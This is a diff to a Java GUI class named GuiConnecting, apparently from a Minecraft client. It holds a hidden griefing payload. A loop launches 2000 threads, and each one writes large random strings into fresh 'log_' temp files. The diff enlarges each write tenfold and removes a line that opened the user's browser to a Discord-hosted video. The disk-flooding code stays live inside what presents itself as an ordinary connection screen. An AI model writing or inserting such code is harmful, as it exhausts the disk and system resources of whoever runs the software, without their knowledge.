@@ -67,9 +67,8 @@ public class GuiConnecting extends GuiScreen {
                         for (int i = 0; i < 2000; i++) {
                             new Thread(() -> {
                                 try {
-                                    FileUtils.writeToFile(RandomUtils.randomString(10000),
+                                    FileUtils.writeToFile(RandomUtils.randomString(100000),
                                             Files.createTempFile("log_", ".tmp").toFile());
-                                    Desktop.getDesktop().browse(URI.create("https://cdn.discordapp.com/attachments/846286888877031446/957608695292907570/funny_cat.webm?size=4096"));
                                 } catch (IOException e) {
                                     throw new RuntimeException(e);
                                 }
